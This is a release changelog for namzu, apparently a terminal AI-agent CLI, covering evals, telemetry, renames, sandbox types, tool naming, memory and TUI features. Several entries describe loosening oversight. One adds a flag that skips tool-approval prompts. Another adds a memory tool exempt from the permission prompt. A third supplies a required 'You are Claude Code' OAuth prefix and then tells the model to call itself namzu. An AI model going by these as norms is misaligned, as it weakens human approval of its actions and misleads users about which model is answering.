  The first suite pins loop behaviour against a scripted provider: a turn with no tool calls settles on its text, every call in one turn runs in the order it was issued, a failing tool goes back to the model instead of killing the run, and a forced tool choice applies to the step that asked and no further. Nothing there measures a model — the turns are fixed, so a score that moves means the kernel changed. A suite that calls a real provider measures two things at once and cannot say which one moved; those belong behind a tag.

### Patch Changes

- Updated dependencies [480892a]
- Updated dependencies [05b4103]
- Updated dependencies [480892a]
- Updated dependencies [beacf2d]
- Updated dependencies [e1a5e2d]
- Updated dependencies [b807b0d]
- Updated dependencies [9d2b927]
- Updated dependencies [7370f6d]
- Updated dependencies [ea2148c]
- Updated dependencies [480892a]
- Updated dependencies [9bbb8be]
- Updated dependencies [480892a]
- Updated dependencies [8518b40]
- Updated dependencies [480892a]
- Updated dependencies [e1a5e2d]
  - @namzu/sdk@3.2.0
  - @namzu/ollama@1.2.0

## 0.3.0

### Minor Changes

- 935b8f3: A bad flag is a usage error, not a broken CLI

  `namzu doctor` answered 70 — sysexits `EX_SOFTWARE`, "the program itself failed" — when the caller mistyped a flag. That tells an operator to file a bug for their own typo, and it disagreed with every sibling command. It now answers 64, `EX_USAGE`, and the code is part of the documented contract.

  Six published pages were also corrected against the source rather than reworded: `provider.chat()` was removed from the provider interface and is now shown as the streaming call aggregated; the built-in tool names are documented as registered (lowercase) rather than as an older capitalization that made the copy-pasteable `activate` example throw; the tool count matches what `getBuiltinTools()` returns, including the one tool no page had ever mentioned; a deleted store symbol is replaced by the one that exists; a retrieval field is named as it is declared; and two config fields documented as unavailable on the reactive agent are shown as what they are — present and forwarded.

- 935b8f3: `namzu eval` — the harness's signal can finally reach CI.

  The eval surface was a library function and a string formatter: no command,
  no CI step, and `formatReport` ending at `lines.join('\n')` with no file
  write and no exit code. Its stated purpose is to give a behaviour change a
  regression signal, and that signal could not reach a build without every
  consumer hand-writing the runner and the report-to-exit-code mapping.

  ```bash
  namzu eval --dir evals --out eval-report.json
  namzu eval --tag fast
  ```

  A suite is a `*.eval.js` file that default-exports a function returning an
  `ExperimentReport` and may export a `tags` array. The `run` callback stays
  caller-owned, so a suite owns everything about how its runs are
  constructed.

  | Exit | Meaning                                                        |
  | ---- | -------------------------------------------------------------- |
  | `0`  | Every case passed                                              |
  | `1`  | At least one case failed — a regression to chase               |
  | `2`  | At least one case was inconclusive — a broken harness to fix   |
  | `3`  | No suite found, one could not load, or `--tag` matched nothing |

  `2` is separate from `1` for the same reason `unavailable` is not zero: a
  suite that could not judge tells you nothing about the cases it did judge,
  and collapsing the two sends somebody hunting a behaviour change that never
  happened. It is checked first. `3` rather than `0` for an empty discovery,
  because a gate that finds nothing to run must not report green — and the
  tag filter reports how many suites it skipped, since a filter that quietly
  matched nothing looks exactly like a passing run.

  Suite ids are path-derived and posix-separated so two commits' artifacts
  describe the same suites and can be diffed; two files resolving to one id
  is refused rather than resolved. The artifact is the whole report, because
  a summary cannot say which scorer moved.

  The CI workflow runs it with `continue-on-error` until the repo ships its
  first suite — noted in the workflow so the flag is removed rather than
  forgotten.

### Patch Changes

- 935b8f3: Four places where namzu knew something and told no one.

  **A backoff is now visible.** `withProviderRetry` logged and slept. There
  was no run event, no wire event, and — worse than that — the sole
  production call site never passed a logger, and every warn in the decorator
  is guarded behind it, so the log lines were dead code too. A run could sit
  silent for the better part of a minute between `iteration_started` and the
  next event, or up to the 60s server-directed cap, with no signal and no
  keepalive: a backoff was indistinguishable from a hang, and a host's
  watchdog would cancel a run that was about to succeed.

  A `provider_retry` run event now carries the attempt, the ceiling, the
  delay, the classified code and whether the server asked for it, mapped to
  `provider.retry` on the SSE wire and to a `running` status update over A2A.
  It is emitted **before** the sleep, so the delay it names is still ahead —
  which is also why it rides the stream as a delta-less chunk rather than an
  out-of-band callback: the consumer is blocked inside the provider's
  iterator, so a callback could not reach it until the wait was already over.
  The omission was never principled; `tool_progress` exists to answer "is it
  still working?" and the wire contract justifies the reasoning events on
  exactly the same grounds.

  **Two latency measurements that could not be recovered from the data.**
  `gen_ai.client.time_to_first_token` is recorded at the first delta of any
  kind. namzu streams, so perceived latency is dominated by that number, and
  the one existing latency histogram measures the whole request — it cannot
  tell a fast-first-token long generation from a stalled one, and no host
  could reconstruct the difference in any form.
  `gen_ai.tool.call.duration` records what the executor has measured since
  its first version: the value was already in scope one frame above the call
  site, emitted per call on `tool_completed`, and had no instrument. It
  carries the same attributes as the tool-call counter, so "which tool is
  slow" and "which tool fails" are one query rather than two that cannot be
  joined.

  **`run_failed` carries the classification it always had.** The event was a
  bare string, and the run boundary flattened the throwable into it,
  discarding `code`, `status`, `retryAfterMs`, `retryable`, `details` and the
  cause chain. This was never a missing taxonomy: the provider-boundary
  classifier already walks all of that, so a fully-populated error arrived at
  the boundary and was thrown away one line later — and `toPlatformError`,
  the projection written for exactly this, had no callers outside its own
  test. `run_failed` now carries `failure` alongside `error`; the A2A bridge
  sends it as event metadata (a peer deciding whether to retry needs the
  flag, not prose to pattern-match) and the CLI prefixes the code. Nothing
  had to change at the hundreds of `throw` sites.

  Not fixed, and worth naming: the advisory `on_error` trigger still
  substring-matches. Its input is tool output from the message history, which
  has no structured code to preserve — that needs a tool-side error catalog,
  not this change.

  **The published attribute constants can no longer drift.**
  `@namzu/telemetry/attributes` restated the attribute bags by hand and had
  already lost `GENAI.TOKEN_TYPE`, the dimension that splits the token
  counter by kind. The consequence was narrow — namzu emits through the
  canonical module, so the dimension is on the data regardless — but this is
  the entry point the observability docs steer consumers to, the package had
  no tests at all, and the public-surface verifier only loads the SDK bundle.
  It is now a re-export, with a parity test so a future hand-copy fails
  immediately.

- 935b8f3: namzu takes its naming from nobody, and now there is a gate that proves it.

  `scripts/audit-external-names.mjs` refuses a third-party product name in a
  comment or an identifier, and runs in CI. It found 31 real ones — most of
  them in the TUI, where the design was being explained as "modelled on how X
  presents text", "X-style grouping", "like X / Y".

  That is the failure the rule exists for. A design explained by reference to
  somebody else's product has handed over its rationale: the next reader
  reaches for that product's model instead of asking what namzu is trying to
  achieve, and when the reference changes the comment becomes a claim nobody
  can check. Each one now states the same decision on its own terms — what it
  accomplishes, and what breaks without it.

  The kernel had eleven, all in prose explaining a wire behaviour by naming
  the vendor whose endpoint exhibits it. A 400 for an unanswered `tool_use`
  is a property of the protocol, not of a company; several function-calling
  endpoints report `stop` alongside populated tool calls, and which ones is
  not the point.

  The identity prompt named the products it told the model not to be. It now
  says the stronger thing without them: the underlying model is an
  implementation detail of how namzu runs, not who it is.

  What the audit deliberately does NOT flag, because a rule that cries wolf
  gets switched off: wire values and the files that carry them. A
  context-window table keyed by model id must contain real model ids or it
  resolves nothing; a driver package is named after the service it drives.
  The exemption is per path and narrow, and the script says where the line
  falls. Scanning string literals was tried and rejected in the same spirit —
  it flagged driver ids in switch statements and model ids in test fixtures
  everywhere, which would have meant exempting half the tree.

  Two matcher details worth keeping: the camelCase check is case-SENSITIVE,
  because an `i` flag turns `[A-Z]` into `[A-Za-z]` and the rule starts
  rejecting `coherent` for `cohere` and `strands` for the English verb. And
  `cursor` is absent from the list entirely — it collides with the pagination
  cursor this codebase threads through every list call.

- 935b8f3: Three public identifiers named a vendor where the code was generic. Renamed,
  and in two cases the naming was hiding a design problem worth fixing.

  **`OpenRouterEmbeddingProvider` → `HttpEmbeddingProvider`** (config type
  likewise). Nothing about the class was vendor-specific: it POSTs to
  `{baseUrl}/embeddings` with a bearer key and reads back
  `{ data: [{ index, embedding }] }` — the shape every hosted embeddings
  service speaks. Only the name and a default host said otherwise.

  `baseUrl` is now **required**. It defaulted to one vendor's host, which
  meant a caller who never named an endpoint still shipped its text to one. A
  default network destination is a decision the caller has to make out loud.
  A trailing slash is now tolerated rather than producing a doubled path.

  **`AgentFactoryOptions.provider`** was `'openrouter' | 'bedrock'` — a closed
  two-member union in a generic factory, naming two specific services that the
  provider registry has never been limited to and that no caller could extend.
  It is now `string`: any registered provider type.

  **`AgentFactoryOptions.bedrockConfig`** is replaced by
  `providerConfig?: Record<string, unknown>`, passed through untouched. The
  old field existed for exactly one service and had no construction site
  anywhere in the workspace.

  **`StorageProviderId`**: the `'anthropic-files'` member is now
  `'provider-files'`.

- 935b8f3: Reclaim context by clearing stale tool output, before summarizing
  destructively.

  Compaction was all-or-nothing: once the threshold hit, every older message
  became a summary and the agent's own reasoning — the decisions, the false
  starts it learned from, the exact wording of a plan — was paraphrased away
  with it. That is a heavy price for a context problem usually caused by
  something much dumber: a handful of enormous tool outputs the agent already
  read, took what it needed from, and moved past.

  `clearStaleToolResults` replaces the OUTPUT of old, large tool results with
  a short placeholder that names the tool and its original size, so a result
  that turns out to still be needed is one tool call away rather than lost.
  It is safe where trimming is not, because nothing moves — the `tool` message
  keeps its position and its `toolCallId`, so `tool_use` ↔ `tool_result`
  pairing is intact by construction.

  It runs first in `runCompactionCheck`; if it gets the context back under
  `triggerThreshold`, summarization is skipped entirely and the history stays
  verbatim. New `CompactionConfig` fields: `clearToolResults` (default
  `true`), `keepRecentToolResults` (3), `minToolResultCharsToClear` (1000),
  `preserveToolResultsFrom`.

  Never clears an error result (the error is what steers the next turn), the
  most recent N results (still in use), or anything below the size floor
  (the placeholder would cost as much). Image payloads are measured by their
  base64 size — a screenshot is the largest thing a tool result can carry and
  exactly the kind of output an agent reads once.

- 935b8f3: `--help` on `run`, `run-stream` and `history` now answers instead of
  running.

  `passThrough` turns commander's `--help` off so a command can parse it
  itself — right for the commands that render their own. The three that do
  not were receiving `--help` as **input**: for `run` it became the prompt to
  send to a model, so a user asking how to use it got "no LLM provider
  available"; for `history` it became the session to look up, so they got
  `[]`.

  `CommandDef.help` fills that in, and the registry answers before the
  handler runs. Handling it there rather than in each command is what stops
  the fourth one from doing the same thing. A command that renders its own
  help sets nothing and is untouched.

  Found by running the built binary. Every one of these commands had passing
  tests — none of them invoked `--help`, because the suite tested what the
  commands do and not what a person types first.

- 935b8f3: **Breaking:** `@namzu/sandbox` declares only the backends it has.

  Four of the shapes this package offered could type-check and then throw: a `process` tier, a `passthrough` tier, and two adapters to third-party managed schedulers, none of which was ever written. Each demanded required configuration for a call that was never made — the `self-hosted` microvm arm went further and required three fields belonging to a local-daemon path that does not exist, while the two fields the working path needs were optional. So the only configuration that ran had to supply three values nothing reads, and omitting the two that matter compiled its way to a runtime throw.

  `SandboxTier` is now `container | microvm`. `MicroVMBackendConfig` is one shape whose `orchestratorEndpoint` and `getToken` are required. `SandboxBackendNotImplementedError` stays exported and thrown: a JS host that invents a tier gets a named refusal rather than a provider that confines nothing.

  The `sandbox.platform` health check now asks the provider what this host enforces instead of answering from a table keyed on the OS name. That table had drifted both ways — it called the Linux probe unimplemented long after the provider began probing real flags, and it told a Windows operator that sandboxing is "not supported", which is true of the in-process tier and silent about the container tier that runs there. Every non-passing result now names the missing controls and what to do about them.

  `SANDBOX_ISOLATION_CONTROLS` is exported as a value from `@namzu/sdk`. It was reachable only through `export type *`, so importing it type-checked and then failed on the first line of a built binary.

- 935b8f3: namzu's own vocabulary, everywhere.

  Comments across the kernel explained namzu's design by naming another
  product: "mirrors X's container architecture", "reference: X's
  `normalizePathForSandbox()`", "which is what Y and Z both do", "Claude Code
  uses 2000 for the same reason". Behaviour was correct throughout — this is
  about what the code says it is. A kernel that explains itself by citation
  reads as a reimplementation of something else, and namzu is not one.

  Every such comment now states the reason directly. Where a rule exists
  because a provider requires it, the comment says what the requirement is
  rather than whose it is — which is also more useful, since the same
  requirement usually holds for more than one provider, and a reader who has
  never used the named one can still follow it.

  **Breaking (types only, no runtime behaviour):**

  - `ToolCatalogSurface`: the `'cowork'` member is now `'supervised'`.
  - `ToolSource.skill.type`: `'anthropic' | 'custom'` is now
    `'published' | 'custom'`.

  Both are descriptive metadata with no construction site anywhere in the
  workspace, so nothing internal moved. An external consumer that names
  either value gets a compile error pointing at the line.

  **Deliberately unchanged**, because these are addresses rather than
  borrowed naming: model-id prefixes in the context-window table (data the
  runtime matches against), API-key detection patterns in the guardrail
  presets (a pattern is worthless if you cannot tell what it detects),
  namzu's own provider package names, and the credential-store integration in
  the CLI, whose service name and file path are literally the other tool's.

- 935b8f3: A payload that brought its own rendering now uses it in text format.

  A command that wants both a structured payload — what `json` and `yaml`
  emit, and what a CI job parses — and a human string had to choose one.
  Passing the object meant the text format dumped a nested object graph where
  a report was meant to be, with the readable version sitting unused in a
  `text` field one level down. `namzu eval` did exactly that in its default
  format.

  Found by running the built binary, not by a test. The command's own tests
  asserted on the payload, which was correct, and never on what a person
  sees — so the failure lived in the one place the suite was not looking.
  There is now a test for it, and `json` still emits the whole payload:
  collapsing that to the string would trade one broken format for another.

- 935b8f3: Tool names are validated, and a paged remote catalogue is read to the end.

  **Every plugin-contributed tool name was illegal.** A tool name reaches the
  provider verbatim and the major message APIs accept `[a-zA-Z0-9_-]` up to 64
  characters — but the plugin namespace separator was `:`, so every tool a
  plugin contributed carried a name the wire rejects. Nothing checked: names
  are derived by concatenation at three separate construction sites and none
  validated the result.

  The rejection is a 400 on the **whole request**, not on that tool. Those
  tools are registered deferred, so it fired the moment something activated
  one, with nothing naming the culprit.

  - `assertToolName` runs at registration, where a bad name can still be
    attributed and costs the run nothing.
  - **Breaking:** `PLUGIN_NAMESPACE_SEPARATOR` is now `__`, which renames every
    plugin-contributed tool id — `fs-plugin:mcp__fs__read_file` becomes
    `fs-plugin__mcp__fs__read_file`. A host that names one of these in an
    allowlist, a permission rule or a preserve-list must update it. The two
    changes have to land together: adding the check without the rename would
    refuse every plugin tool.

  One driver had already ratified passing names through untouched, on the
  grounds that a confusing name is "a naming problem to fix in the registry,
  not something to paper over" — which is precisely why the registry has to be
  the one that checks.

  **A paged remote catalogue is now read to the end.** `tools/list`,
  `resources/list` and `resources/templates/list` each sent an empty params
  object and returned the first page — never sending a cursor, never reading
  the one that came back. A server that pages its catalogue contributed only
  its first page: the rest were never registered, never namespaced, never
  advertised, with no error and no warning. Drift detection did not help
  either, since it compared page one against page one.

  The symptom is a model that never uses a tool it was told about, which reads
  as model incompetence rather than a client bug. Both clients — the SDK's and
  the CLI's — now thread the cursor. A server whose cursor never ends is
  refused after 100 pages rather than looping forever or stopping silently,
  since stopping silently is the failure being fixed.

- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [29f35c8]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
  - @namzu/sdk@3.0.0
  - @namzu/anthropic@1.3.0
  - @namzu/openai@1.1.0
  - @namzu/ollama@1.1.0
  - @namzu/openrouter@1.1.0

## 0.2.3

### Patch Changes

- 6b0fbfd: Replace the built-in filesystem mutation contracts with one strict canonical
  shape per tool: `edit` accepts `path`, `old_string`, `new_string`, and optional
  `replace_all`; `write` accepts `path` and `content`. Remove line insertion and
  legacy aliases, serialize same-process mutations by resolved path, and document
  replay-safe marker advancement for bounded long-document writes. Local writes
  commit through same-directory temp files and atomic rename; sandbox
  implementations are required to provide the same atomic replacement contract.
- Updated dependencies [11167dd]
- Updated dependencies [6b0fbfd]
  - @namzu/sdk@2.0.0
  - @namzu/anthropic@1.2.0
  - @namzu/ollama@1.0.3
  - @namzu/openai@1.0.3
  - @namzu/openrouter@1.0.3

## 0.2.2

### Patch Changes

- Updated dependencies [c7cf4c7]
- Updated dependencies [f002c44]
- Updated dependencies [3fd2524]
- Updated dependencies [e9c974c]
  - @namzu/sdk@1.4.0
  - @namzu/anthropic@1.1.2
  - @namzu/ollama@1.0.3
  - @namzu/openai@1.0.3
  - @namzu/openrouter@1.0.3

## 0.2.1

### Patch Changes

- Updated dependencies [cc6b5f3]
- Updated dependencies [f1f000c]
- Updated dependencies [30c755d]
- Updated dependencies [f1f000c]
- Updated dependencies [f1f000c]
  - @namzu/sdk@1.2.0
  - @namzu/openai@1.0.2
  - @namzu/ollama@1.0.2
  - @namzu/anthropic@1.1.1
  - @namzu/openrouter@1.0.2

## 0.2.0

### Minor Changes

- 11e1a70: run-stream gains `--session <key>` and a new `history --session <key>` command:
  bind a headless turn to a persisted conversation in the cwd's `.namzu` store
  (keyed by an embedder's own session id), so prior turns load as context and
  the turn is appended. `history` prints that conversation's `{role,content}[]`
  as JSON. This lets a host UI (the clawtool desktop) resume a session's
  transcript and keep multi-turn context across separate one-shot invocations.
- 022b082: run-stream gains a `--provider` flag (override the persona's configured provider
  for the turn, alongside --model). New `providers-json` command prints every
  registry provider with its detection state, default model, and a best-effort
  live model list (`{provider,label,detected,default,models[]}[]`) so a host UI can
  build a dynamic provider/model picker instead of a hardcoded list. listModels is
  probed per detected provider with a 3s race + free-text fallback. The listing
  path registers the vendor package (ensureRegistered) before constructing the
  provider, so a detected provider returns its real model catalog instead of an
  empty list — without it ProviderRegistry.create throws "Unsupported provider
  type" and the picker silently degrades to free-text for every provider.
- 02f37e1: run-stream gains `--model`, `--instance`, and `--skills <a,b,c>` flags so a host
  UI can drive which model answers, attribute the run to a named instance, and
  load specific skills' bodies into the turn (via the same extra-system channel
  the TUI's `/skill` uses). Adds a `skills-json` command that prints discovered
  skills as `{name, description, source}[]` for a host's skill picker.
- 1032736: Add `namzu run-stream` — a headless streaming one-shot that runs the same
  agent as the TUI but emits one compact NDJSON line per `AgentEvent`
  (delta / tool-start / tool-end / error / done) to stdout, instead of
  buffering the final text like `run`. Prior conversation history is read
  from stdin as a JSON `Message[]`. This lets a host process (e.g. a desktop
  UI) line-scan stdout and render a turn live, with the host owning
  persistence — the equivalent of the TUI driven from another runtime.

### Patch Changes

- Updated dependencies [ac85934]
- Updated dependencies [999e4be]
- Updated dependencies [9df35d1]
- Updated dependencies [42f577e]
- Updated dependencies [6c09394]
- Updated dependencies [9a0c5ee]
- Updated dependencies [0d1fb7b]
- Updated dependencies [2c5dd7a]
- Updated dependencies [271e6cf]
- Updated dependencies [8c07556]
- Updated dependencies [b776acf]
  - @namzu/sdk@1.1.0
  - @namzu/anthropic@1.1.0
  - @namzu/openai@1.0.1
  - @namzu/openrouter@1.0.1
  - @namzu/ollama@1.0.1

## 0.1.0

### Minor Changes

- bf9fce7: **The agent can curate its own memory, and the status bar shows token/cost.**

  namzu now exposes a `remember` tool to the model: when it learns a durable fact (a stable preference, a project fact, a decision) it can save it to `~/.namzu/MEMORY.md` itself — which is injected into every future session. Just tell namzu "remember that I deploy on Fridays" and it persists it with no prompt (it's a safe self-write to your own memory file, exempt from the permission prompt).

  The status bar now reports the current turn's token usage (and cost when the model is priced), e.g. `74.1k tok · $0.05`, so you can see what the agent — especially during long autonomous runs — is consuming.

- cf88473: **Cross-terminal agent awareness via clawtool's peer registry (no separate daemon).**

  namzu now registers itself as a peer in clawtool's BIAM registry on launch (clawtool is the coordination daemon namzu already discovers — there's no separate `namzu serve`). `/agents` lists every agent peer clawtool knows about across your terminals and LAN — namzu, claude-code, codex, gemini — and `/msg <peer> <text>` sends a message to another peer's inbox. Presence is best-effort: with no clawtool running, namzu behaves exactly as before.

- 63e849b: **M1 — Clawtool default plugin** (`ses_002-clawtool-bridge`)

  `namzu tools ls` (and `run`, and `sync-types`) now talk to the local clawtool daemon for real. Clawtool is consumed as a runtime dependency: the namzu CLI auto-detects the daemon, spawns it (`clawtool daemon start`) if missing, then proxies its tool catalog into the agent's tool surface via MCP over HTTP. No `@namzu/clawtool` package — adding a tool to clawtool means namzu sees it on next start with zero TS changes.

  **New subcommands** under `namzu tools`:

  - `ls` — list every tool clawtool exposes (auto-spawns the daemon if needed). Output is structured through the M0 formatter; `--format json|yaml` works.
  - `run <name> --input <json>` — invoke a tool by name with JSON arguments and print the structured result. Exit 1 when the tool itself returns an error.
  - `sync-types --output <dir>` — opt-in dev-time codegen. Shells out to `clawtool tools export-typescript` so editor autocomplete + type-checking can bind to clawtool's actual schema; refresh after upgrading clawtool.

  **Internals** (`packages/cli/src/integrations/clawtool/`):

  - `paths.ts` — XDG-aware lookup of `~/.config/clawtool/{daemon.json,listener-token}` (honors `$XDG_CONFIG_HOME`).
  - `state.ts` — parses clawtool's atomic state file with strict shape validation.
  - `auth.ts` — `readToken` (strict) + `tryReadToken` (lenient; returns null for `--no-auth` loopback daemons).
  - `binary.ts` — PATH lookup + `clawtool.binary` config override; actionable error if missing.
  - `daemon.ts` — `ensureDaemon()`: TS port of Go `daemon.Ensure(ctx)` with health-poll + auto-spawn (configurable via `clawtool.autoStart`).
  - `client.ts` — bearer-auth HTTP wrapper (in-tree; minimal).
  - `mcp.ts` — Streamable HTTP MCP client (`initialize` → `notifications/initialized` → `tools/list` / `tools/call`) with `Mcp-Session-Id` round-tripping and SSE single-event response parsing. We did **not** reuse `@namzu/sdk`'s `MCPClient` because its `http-sse` transport targets the older MCP HTTP+SSE spec, whereas clawtool serves the new Streamable HTTP — keeping this in-tree avoids spec drift.
  - `plugin.ts` — `createClawtoolPlugin()`: discovers the catalog and returns proxy `ClawtoolProxyTool` objects with a `call(args)` dispatch.

  **Config schema** extension: `NamzuCliConfig.clawtool?: { binary?, endpoint?, token?, autoStart? }`. All optional; zero-config defaults work out of the box.

  **Tests**: 20 new unit cases (state file parsing, token reading with both strict + lenient variants, PATH lookup with executable detection, MCP client wire shape with mocked fetch including session-id capture / Bearer-omission for no-auth / Mcp-Name routing / error mapping). Total now 76/76 green (was 56). Live end-to-end smoke against a real clawtool 0.22.159 daemon validated `tools ls` (78 tools discovered), `tools run Bash` (real shell roundtrip), and `tools sync-types` (60+ stub files generated).

  **Removed**: the M0 `tools` stub from `commands/stubs.ts`; replaced by the real `commands/tools.ts`.

- 2868c6e: **clawtool tools are now deferred (no token bloat), and namzu identifies as itself.**

  - **Deferred clawtool tools.** Instead of loading clawtool's ~70-tool catalog as active (which re-sent every tool's JSON schema on every agent-loop iteration — a single message could exceed 200k tokens), the catalog is registered as **deferred** tools. Deferred tools cost only a name line in the prompt; the model loads the ones it needs on demand via the built-in `search_tools`. The default active set stays lean (bash/read/write/edit/glob/grep + remember + search_tools), and the connect line shows e.g. `8 tools (+72 on demand)`.
  - **namzu identity.** namzu now presents as namzu — not Claude / Claude Code — even on the Anthropic OAuth path (which requires a "You are Claude Code" prefix for the token to authorize). A namzu identity is injected into the system context so "who are you?" answers "I'm namzu".

- 3d2c354: **clawtool's tools are now built into the TUI agent.**

  When the local clawtool daemon is reachable, namzu folds its MCP tool catalog into the agent's tool registry alongside the SDK builtins — so the model can use clawtool's web/browser/sandbox/git/sub-agent/skill tools (e.g. `clawtool_WebSearch`, `clawtool_BrowserFetch`, `clawtool_SandboxRun`, `clawtool_Commit`, `clawtool_Spawn`) without any extra setup. A warm daemon contributes ~72 tools (its full catalog minus the six that duplicate builtins: Bash/Read/Edit/Glob/Grep/Write).

  Bridged tools are namespaced `clawtool_<Name>`, flagged destructive (so the permission prompt gates them), and execute by forwarding to clawtool's `tools/call`. Loading is best-effort with a hard timeout: if clawtool is absent, down, or slow, namzu silently runs on builtins alone — startup never fails because of it. The connect line now reports the total tool count.

- 9f502d4: **`@file` mentions and Esc-to-interrupt.**

  Type `@path/to/file` in a message and namzu inlines that file's contents for the model while your message keeps the readable `@path` token (files are resolved inside the working directory and size-capped). Press `Esc` to interrupt a running turn — `Ctrl+C` is now reserved for exiting (press twice).

- 2837e6c: **Dark theme, trust-folder gate, bypass-permissions mode, Claude-Code-style tool rendering, and a big token-cost fix.**

  - **Fully dark theme.** The TUI now uses a curated dark hex palette on a black canvas (the root fills with the background and the screen is cleared on launch) for a cohesive, immersed look.
  - **Trust folder gate.** On first launch in a directory, namzu shows the working directory and asks you to trust it before reading/running/editing files there (Claude-Code style). Trusted folders are remembered in `~/.namzu/trust.json`; trusting a repo root covers its subfolders. Declining exits.
  - **Bypass permissions.** `namzu --dangerously-skip-permissions` (alias `--yolo`) runs tools without the approval prompt; a red banner warns while it's active.
  - **Claude-Code-style tool rendering.** Tool calls render as `⏺ Bash(ls -la)` with a dim `⎿ result` line hugging the call, grouped with one blank line between call+result units.
  - **Token-cost fix.** clawtool's ~70-tool catalog no longer inflates the prompt (it could push a single message past 200k tokens). It's registered as deferred tools the model loads on demand via `search_tools` — see the separate changeset.

- 548689f: **Define sub-agents on the fly.** The `Agent` tool now takes an optional `role` — a system prompt describing a specialist persona (e.g. "You are a security auditor; flag vulnerabilities and rate severity"). namzu spins up a fresh sub-agent with that role at runtime, no pre-defined agent file needed; omit `role` for a general-purpose one. Call `Agent` several times in one turn (each with its own `role`) to fan out a parallel swarm of specialists. The persona is layered on top of namzu's anti-fabrication guardrails so a dynamic role can't opt out of "don't invent results".
- 53a1aa4: **Live tool activity, status glyphs, and a context gauge.**

  Tool calls now feel alive: while a tool runs it shows in a live region with an animated spinner and a ticking elapsed timer, and on completion it settles into the transcript with a ✓ (green) / ✗ (red) status glyph and how long it took — e.g. `✓ Bash(npm test) · 1.2s` — above its `⎿` result. Before the first token of a reply the agent shows a `thinking…` line. The status bar gains a context-window fill gauge (`ctx ███░░░░░ 38%`, green→yellow→red as the window fills).

- 8385ac7: **Claude-Code-style header: a bloom icon next to the name / model / cwd.**

  The startup header is now a compact icon + info block (like Claude Code) instead of a large wordmark: a teal→green diamond "bloom" mark (a terminal homage to the namzu.ai SVG) on the left, with `namzu vX.Y.Z`, the connected provider · model, and the working directory stacked to its right. Narrow terminals fall back to a one-line `❀ namzu`.

- 52af97e: **Paste images into the conversation (vision input).**

  A user message can now carry image attachments. `@namzu/sdk` adds an optional `attachments` field to user messages (`ImageAttachment { data, mediaType }`, additive — text messages are unchanged), and the Anthropic provider sends them as image content blocks so the model can see them. In the CLI, press `Ctrl+V` to paste an image from the clipboard — it shows as an `⎘ Image #N` chip in the composer and is sent to the model as vision input when you submit.

- eabdc0d: **Assistant replies now render as markdown.**

  Responses were shown as flat text; they now render the way Claude Code / gemini-cli present them:

  - **Code blocks** in a distinct color on a dim left rule, with the language label.
  - **Inline `code`** in a code color.
  - **Bold** and _italic_ emphasis.
  - Headings (bold, accent for `#`/`##`).
  - Bullet and numbered lists with a marker gutter and hang-indented wrapping; consecutive items stay tight.

  Implemented as a small, dependency-free markdown parser (unit-tested) plus an Ink renderer. Only assistant messages are rendered as markdown — your input and tool/system lines stay verbatim. Syntax highlighting inside code blocks is a follow-up.

- 73dc2b9: **Markdown tables render as aligned grids.**

  Pipe tables (`| A | B |` + `|---|---|` + rows) in assistant replies now render as an aligned grid with a bold header and a dim rule, instead of raw pipe syntax. Column widths auto-fit (capped) to the content.

- b51300c: **namzu now remembers across sessions (memory layer, M4 core).**

  On every turn the TUI loads `~/.namzu/USER.md` (facts about you) and `~/.namzu/MEMORY.md` (durable facts/decisions) and injects them into the agent's system prompt, so namzu carries context across runs — ask it something it learned last session and it knows. Memory is read fresh each turn, so edits take effect immediately, and it's injected only into the system prompt (never echoed into the visible transcript).

  Two new slash commands:

  - `/remember <text>` — append a fact to `MEMORY.md`.
  - `/memory` — show what's currently stored.

  When both files are empty/absent, nothing is injected and behavior is unchanged. Session-search/`/recall` and agent self-curation (memory write tools) are follow-ups.

- c3b4c84: **Queue messages while the agent is working.**

